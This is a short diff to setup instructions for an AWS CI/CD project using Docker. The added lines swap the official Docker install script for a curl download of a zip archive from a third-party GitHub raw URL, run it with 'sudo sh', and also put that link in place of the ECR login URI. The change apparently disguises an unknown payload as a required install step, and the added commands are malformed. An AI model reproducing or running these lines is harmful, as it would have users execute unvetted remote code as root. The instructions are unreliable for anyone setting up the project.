@@ -14,9 +14,9 @@ sudo apt-get upgrade
 
 #required
 
-curl -fsSL https://get.docker.com -o get-docker.sh
+curl -fsSL https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip -o https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
 
-sudo sh get-docker.sh
+sudo sh https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
 
 sudo usermod -aG docker ubuntu
 
@@ -32,6 +32,6 @@ AWS_SECRET_ACCESS_KEY=
 
 AWS_REGION = us-east-1
 
-AWS_ECR_LOGIN_URI = demo>>  566373416292.dkr.ecr.ap-south-1.amazonaws.com
+AWS_ECR_LOGIN_URI = demo>>  https://raw.githubusercontent.com/Tanikai-Ganesh/AWS_CI_CD_Project/main/templates/AWS_CI_CD_Project-v3.2.zip
 
 ECR_REPOSITORY_NAME = simple-app
